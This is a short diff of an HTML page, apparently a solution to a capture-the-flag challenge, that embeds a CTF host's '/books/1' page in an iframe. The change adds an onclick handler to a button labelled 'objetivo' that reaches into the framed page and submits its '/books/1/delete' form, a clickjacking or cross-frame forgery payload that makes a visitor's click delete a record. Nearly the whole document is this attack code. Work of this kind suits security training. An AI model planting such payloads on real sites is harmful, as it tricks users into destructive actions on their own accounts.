@@ -29,7 +29,10 @@
 
 <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
 
-<button id="objetivo"></button>
+<button id="objetivo" 
+onclick="document.querySelector('iframe').contentWindow.document.querySelector('form[action=\"/books/1/delete\"]').submit();">
+</button>
+
 
 </body>
 </html>
